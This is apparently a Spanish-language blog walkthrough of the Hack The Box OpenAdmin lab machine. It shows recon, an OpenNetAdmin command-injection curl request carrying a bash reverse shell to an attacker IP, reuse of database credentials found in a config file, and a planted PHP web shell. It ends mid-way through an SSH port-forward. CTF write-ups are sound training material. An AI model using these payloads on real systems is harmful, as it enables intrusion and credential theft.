<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box OpenAdmin - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina OpenAdmin en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box OpenAdmin">
<meta property="og:url" content="http://localhost:4000/htb-openadmin/">


  <meta property="og:description" content="Resolución de la máquina OpenAdmin en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-openadmin/openadmin.jpg">





  <meta property="article:published_time" content="2022-01-02T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-openadmin/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Artículos</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categorías</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Etiquetas</a>
            </li>
<li class="masthead__menu-item">
              <a href="/buscador/">Buscador</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">Contacto</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box OpenAdmin</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box OpenAdmin">
    <meta itemprop="description" content="Resolución de la máquina OpenAdmin en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="January 02, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box OpenAdmin
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-02T00:00:00-06:00">January 02, 2022 </time> 
          
          
        </p>
        <p><img src="/assets/images/htb-openadmin/banner-openadmin.jpg" alt=""></p>

<h2 id="openadmin">OpenAdmin</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.171.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.171
PING 10.10.10.171 <span class="o">(</span>10.10.10.171<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.171: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>142 ms

<span class="nt">---</span> 10.10.10.171 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 141.934/141.934/141.934/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.171 <span class="nt">-oG</span> allPorts
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-02 20:53 CST
Initiating Ping Scan at 20:53
Scanning 10.10.10.171 <span class="o">[</span>4 ports]
Completed Ping Scan at 20:53, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 20:53
Scanning 10.10.10.171 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.10.171
Discovered open port 22/tcp on 10.10.10.171
SYN Stealth Scan Timing: About 41.36% <span class="k">done</span><span class="p">;</span> ETC: 20:54 <span class="o">(</span>0:00:44 remaining<span class="o">)</span>
Completed SYN Stealth Scan at 20:54, 66.70s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.171
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>67.00 seconds
           Raw packets sent: 66481 <span class="o">(</span>2.925MB<span class="o">)</span> | Rcvd: 66478 <span class="o">(</span>2.659MB<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.171
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.171 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-02 20:55 CST
Nmap scan report <span class="k">for </span>10.10.10.171
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 <span class="o">(</span>RSA<span class="o">)</span>
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.79 seconds
</code></pre></div></div>

<p>Vemos el puerto 80 abierto, por lo que antes de ver su contenido vía web, vamos a ocupar la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.171/
http://10.10.10.171/ <span class="o">[</span>200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.171], Title[Apache2 Ubuntu Default Page: It works]
</code></pre></div></div>

<p>No vemos nada interesante, asi que vamos a verlo vía web:</p>

<p><img src="/assets/images/htb-openadmin/openadmin-web.png" alt=""></p>

<p>Es la página default de Apache2, asi que a este punto vamos a tratar de descubrir rutas del servidor con <code class="language-plaintext highlighter-rouge">wfuzz</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>964 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.171/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.171/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000172:   301        9 L      28 W       312 Ch      "music"                                                         
000005045:   301        9 L      28 W       314 Ch      "artwork"                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 389.5932
Processed Requests: 25512
Filtered Requests: 25510
Requests/sec.: 65.48367
</span></code></pre></div></div>

<p>Tenemos dos recursos, <code class="language-plaintext highlighter-rouge">/music</code> y <code class="language-plaintext highlighter-rouge">/artwork</code>, vamos a ver que onda:</p>

<p><img src="/assets/images/htb-openadmin/openadmin-web1.png" alt=""></p>

<p><img src="/assets/images/htb-openadmin/openadmin-web2.png" alt=""></p>

<p>Ya vemos algo que nos debe de llamar la atención, en el recurso <code class="language-plaintext highlighter-rouge">/music</code> tenemos un <strong>Login</strong>, así que vamos a darle click.</p>

<p><img src="/assets/images/htb-openadmin/openadmin-web3.png" alt=""></p>

<p>Nos encontramos ante <strong><em>OpenNetAdmin</em></strong> de versión 18.1.1; por lo que vamos a buscar posibles exploits relacionados y encontramos uno que nos puede ayudar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit opennetadmin 18.1.1
<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                 |  Path
<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
OpenNetAdmin 18.1.1 - Command Injection Exploit <span class="o">(</span>Metasploit<span class="o">)</span>                                   | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                    | php/webapps/47691.sh
<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
Papers: No Results
</code></pre></div></div>

<p>Si checamos <code class="language-plaintext highlighter-rouge">php/webapps/47691.sh</code>, ya que en este sitio no ocupamos metasploit, vemos que manda cierta data por el método POST mediante la herramienta <code class="language-plaintext highlighter-rouge">curl</code>; así que vamos a quedarnos con eso y tratar de entablarnos una reverse shell, por lo que nos ponemos en escucha por el puerto 443:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">--silent</span> <span class="nt">-d</span> <span class="s2">"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;bash -c 'bash -i &gt;&amp; /dev/t
cp/10.10.14.27/443 0&gt;&amp;1'&amp;xajaxargs[]=ping"</span> <span class="s2">"http://10.10.10.171/ona/"</span>
</code></pre></div></div>

<p>Vemos que no se nos entabla la reverse shell, así que vamos a modificar los ampersand (&amp;) por su valor en URL encode (%26).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">--silent</span> <span class="nt">-d</span> <span class="s2">"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.27/443 0&gt;%261'&amp;xajaxargs[]=ping"</span> <span class="s2">"http://10.10.10.171/ona/"</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...

connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.171] 40406
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1300<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@openadmin:/opt/ona/www<span class="nv">$ </span>
www-data@openadmin:/opt/ona/www<span class="nv">$ </span><span class="nb">whoami
whoami
</span>www-data
www-data@openadmin:/opt/ona/www<span class="err">$</span>
</code></pre></div></div>

<p>Ya nos encontramos como el usuario <strong>www-data</strong> y antes de hacer cualquier cosa, vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Ahora dentro del directorio en donde nos encontramos, ya vemos algunas cosas curiosas, como archivos y directorios de configuración:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@openadmin:/opt/ona/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 72
drwxrwxr-x 10 www-data www-data 4096 Nov 22  2019 <span class="nb">.</span>
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ..
<span class="nt">-rw-rw-r--</span>  1 www-data www-data 1970 Jan  3  2018 .htaccess.example
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config
<span class="nt">-rw-rw-r--</span>  1 www-data www-data 1949 Jan  3  2018 config_dnld.php
<span class="nt">-rw-rw-r--</span>  1 www-data www-data 4160 Jan  3  2018 dcm.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images
drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include
<span class="nt">-rw-rw-r--</span>  1 www-data www-data 1999 Jan  3  2018 index.php
drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 <span class="nb">local</span>
<span class="nt">-rw-rw-r--</span>  1 www-data www-data 4526 Jan  3  2018 login.php
<span class="nt">-rw-rw-r--</span>  1 www-data www-data 1106 Jan  3  2018 logout.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins
www-data@openadmin:/opt/ona/www<span class="err">$</span>
</code></pre></div></div>

<p>Si revisamos los archivos, no vemos nada interesante, así que vamos a realizar una busqueda para directorios <code class="language-plaintext highlighter-rouge">config</code> y vemos uno bajo <code class="language-plaintext highlighter-rouge">./local/config</code> y si le echamos un ojo, tiene un archivo <code class="language-plaintext highlighter-rouge">database_settings.inc.php</code> el cual tiene unas credenciales:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> www-data@openadmin:/opt/ona/www<span class="nv">$ </span>find <span class="se">\-</span>name config 2&gt;/dev/null
./config
./local/config
www-data@openadmin:/opt/ona/www<span class="nv">$ </span><span class="nb">cd local</span>/config/
www-data@openadmin:/opt/ona/www/local/config<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 8
<span class="nt">-rw-r--r--</span> 1 www-data www-data  426 Nov 21  2019 database_settings.inc.php
<span class="nt">-rw-rw-r--</span> 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
<span class="nt">-rw-r--r--</span> 1 www-data www-data    0 Nov 21  2019 run_installer
www-data@openadmin:/opt/ona/www/local/config<span class="nv">$ </span><span class="nb">cat </span>database_settings.inc.php 
&lt;?php

<span class="nv">$ona_contexts</span><span class="o">=</span>array <span class="o">(</span>
  <span class="s1">'DEFAULT'</span> <span class="o">=&gt;</span> 
  array <span class="o">(</span>
    <span class="s1">'databases'</span> <span class="o">=&gt;</span> 
    array <span class="o">(</span>
      0 <span class="o">=&gt;</span> 
      array <span class="o">(</span>
        <span class="s1">'db_type'</span> <span class="o">=&gt;</span> <span class="s1">'mysqli'</span>,
        <span class="s1">'db_host'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span>,
        <span class="s1">'db_login'</span> <span class="o">=&gt;</span> <span class="s1">'ona_sys'</span>,
        <span class="s1">'db_passwd'</span> <span class="o">=&gt;</span> <span class="s1">'n1nj4W4rri0R!'</span>,
        <span class="s1">'db_database'</span> <span class="o">=&gt;</span> <span class="s1">'ona_default'</span>,
        <span class="s1">'db_debug'</span> <span class="o">=&gt;</span> <span class="nb">false</span>,
      <span class="o">)</span>,
    <span class="o">)</span>,
    <span class="s1">'description'</span> <span class="o">=&gt;</span> <span class="s1">'Default data context'</span>,
    <span class="s1">'context_color'</span> <span class="o">=&gt;</span> <span class="s1">'#D3DBFF'</span>,
  <span class="o">)</span>,
<span class="o">)</span><span class="p">;</span>

?&gt;www-data@openadmin:/opt/ona/www/local/config<span class="err">$</span>
</code></pre></div></div>

<p>Ahora vamos a ver que usuarios se encuentran a nivel de sistema, ya que es posible que la contraseña que tenemos sea de alguno de los usuarios:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> www-data@openadmin:/opt/ona/www/local/config<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s2">"sh"</span>
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
www-data@openadmin:/opt/ona/www/local/config<span class="err">$</span>
</code></pre></div></div>

<p>Vamos a tratar de migrar al usuario <strong>jimmy</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> www-data@openadmin:/opt/ona/www/local/config<span class="nv">$ </span>su jimmy
Password: 
jimmy@openadmin:/opt/ona/www/local/config<span class="nv">$ </span><span class="nb">whoami
</span>jimmy
jimmy@openadmin:/opt/ona/www/local/config<span class="err">$</span>
</code></pre></div></div>

<p>Ya somos el usuario <strong>jimmy</strong>. Ahora vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jimmy@openadmin:/opt/ona/www/local/config<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jimmy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jimmy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>jimmy<span class="o">)</span>,1002<span class="o">(</span>internal<span class="o">)</span>
jimmy@openadmin:/opt/ona/www/local/config<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span>: PERM_ROOT: setresuid<span class="o">(</span>0, <span class="nt">-1</span>, <span class="nt">-1</span><span class="o">)</span>: Operation not permitted
<span class="nb">sudo</span>: error initializing audit plugin sudoers_audit
jimmy@openadmin:/opt/ona/www/local/config<span class="nv">$ </span><span class="nb">cd</span> /
jimmy@openadmin:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null                                                                                 
./usr/lib/openssh/ssh-keysign                                                                                                    
./usr/lib/eject/dmcrypt-get-device                                                                                               
./usr/lib/snapd/snap-confine                                                                                                     
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                     
./usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                     
./usr/lib/policykit-1/polkit-agent-helper-1                     
./usr/bin/newgrp     
./usr/bin/pkexec                                                
./usr/bin/newgidmap                                             
./usr/bin/sudo                 
./usr/bin/passwd                                                
./usr/bin/newuidmap                                             
./usr/bin/chsh    
./usr/bin/traceroute6.iputils
./usr/bin/chfn               
./usr/bin/gpasswd           
./usr/bin/at
./bin/ping         
./bin/umount             
./bin/su                      
./bin/mount                                                     
./bin/fusermount    
./snap/core/7270/bin/mount
./snap/core/7270/bin/ping                                       
./snap/core/7270/bin/ping6
./snap/core/7270/bin/su
./snap/core/7270/bin/umount                                     
./snap/core/7270/usr/bin/chfn
./snap/core/7270/usr/bin/chsh
./snap/core/7270/usr/bin/gpasswd                                                                                                 
./snap/core/7270/usr/bin/newgrp
./snap/core/7270/usr/bin/passwd
./snap/core/7270/usr/bin/sudo
./snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/7270/usr/lib/openssh/ssh-keysign
./snap/core/7270/usr/lib/snapd/snap-confine
./snap/core/7270/usr/sbin/pppd
./snap/core/8039/bin/mount
./snap/core/8039/bin/ping
./snap/core/8039/bin/ping6
./snap/core/8039/bin/su
./snap/core/8039/bin/umount
./snap/core/8039/usr/bin/chfn
./snap/core/8039/usr/bin/chsh
./snap/core/8039/usr/bin/gpasswd
./snap/core/8039/usr/bin/newgrp
./snap/core/8039/usr/bin/passwd
./snap/core/8039/usr/bin/sudo
./snap/core/8039/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/8039/usr/lib/openssh/ssh-keysign
./snap/core/8039/usr/lib/snapd/snap-confine
./snap/core/8039/usr/sbin/pppd
jimmy@openadmin:/<span class="nv">$ </span>find <span class="se">\-</span>user jimmy 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-E</span> <span class="s2">"sys|proc|run"</span>
./var/www/internal
./var/www/internal/main.php
./var/www/internal/logout.php
./var/www/internal/index.php
./home/jimmy
./home/jimmy/.local
./home/jimmy/.local/share
./home/jimmy/.local/share/nano
./home/jimmy/.local/share/nano/search_history
./home/jimmy/.bashrc
./home/jimmy/.cache
./home/jimmy/.cache/motd.legal-displayed
./home/jimmy/.profile
./home/jimmy/.gnupg
./home/jimmy/.gnupg/private-keys-v1.d
./home/jimmy/.bash_history
./home/jimmy/.bash_logout
jimmy@openadmin:/<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que el usuario <strong>jimmy</strong> es propietarios de archivos alojados en la ruta <code class="language-plaintext highlighter-rouge">/var/www/internal</code>, así que vamos a echarles un ojo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jimmy@openadmin:/var/www/internal<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 12
<span class="nt">-rwxrwxr-x</span> 1 jimmy internal 3229 Nov 22  2019 index.php
<span class="nt">-rwxrwxr-x</span> 1 jimmy internal  185 Nov 23  2019 logout.php
<span class="nt">-rwxrwxr-x</span> 1 jimmy internal  339 Nov 23  2019 main.php
jimmy@openadmin:/var/www/internal<span class="nv">$ </span>
</code></pre></div></div>

<p>Vemos otro recurso web, sin embargo, no es lo que nosotros vemos por el puerto 80, así que trataremos de ver bajo que puerto correo este recurso.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jimmy@openadmin:/var/www/internal<span class="nv">$ </span><span class="nb">cd</span> /etc/apache2/sites-available/
jimmy@openadmin:/etc/apache2/sites-available<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 16
<span class="nt">-rw-r--r--</span> 1 root root 6338 Jul 16  2019 default-ssl.conf
<span class="nt">-rw-r--r--</span> 1 root root  303 Nov 23  2019 internal.conf
<span class="nt">-rw-r--r--</span> 1 root root 1329 Nov 22  2019 openadmin.conf
jimmy@openadmin:/etc/apache2/sites-available<span class="nv">$ </span><span class="nb">cat </span>internal.conf 
Listen 127.0.0.1:52846

&lt;VirtualHost 127.0.0.1:52846&gt;
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

&lt;IfModule mpm_itk_module&gt;
AssignUserID joanna joanna
&lt;/IfModule&gt;

    ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
    CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined

&lt;/VirtualHost&gt;
jimmy@openadmin:/etc/apache2/sites-available<span class="err">$</span>
</code></pre></div></div>

<p>Tenemos que este sitio web corre bajo el puerto 52846, el cual no es visible desde afuera y está interno en la máquina. Además, el usuario asignado es <strong>joanna</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jimmy@openadmin:/etc/apache2/sites-available<span class="nv">$ </span>netstat <span class="nt">-nat</span> | <span class="nb">grep </span>52846
tcp        0      0 127.0.0.1:52846         0.0.0.0:<span class="k">*</span>               LISTEN     
jimmy@openadmin:/etc/apache2/sites-available<span class="err">$</span>
</code></pre></div></div>

<p>Como el usuario asignado es <strong>joanna</strong>, podriamos crear una shell en el directorio, hacer un <strong><em>Remote Port Forwarding</em></strong> para acceder a nuestra shell y entablarnos una reverse shell, que en este caso sería como el usuario asignado.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jimmy@openadmin:/var/www/internal<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 16
<span class="nt">-rwxrwxr-x</span> 1 jimmy internal 3229 Nov 22  2019 index.php
<span class="nt">-rwxrwxr-x</span> 1 jimmy internal  185 Nov 23  2019 logout.php
<span class="nt">-rwxrwxr-x</span> 1 jimmy internal  339 Nov 23  2019 main.php
<span class="nt">-rw-rw-r--</span> 1 jimmy jimmy      66 Jan  3 04:35 shell.php
jimmy@openadmin:/var/www/internal<span class="nv">$ </span><span class="nb">cat </span>shell.php 
&lt;?php
        <span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nb">.</span> shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span> <span class="nb">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
?&gt;
jimmy@openadmin:/var/www/internal<span class="err">$</span>
</code></pre></div></div>

<p>Hacemos el <strong><em>Remote Port Forwarding</em></strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jimmy@openadmin:/var/www/internal<span class="nv">$ </span>ssh <span class="nt">-R</span> 52846:127.0.0.1:52846 k4miyo@10.10.14.27 <span class="nt">-p</span> 2222
The authenticity of host <span class="s1">'[10.10.14.27]:2222 ([10.10.14.27]:2222)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:X+58wT4JhCZo1JHA1IfaUg4HqR7NmOzkqFouwQwkYu0.
Are you sure you want to continue connecting (yes/no)? yes
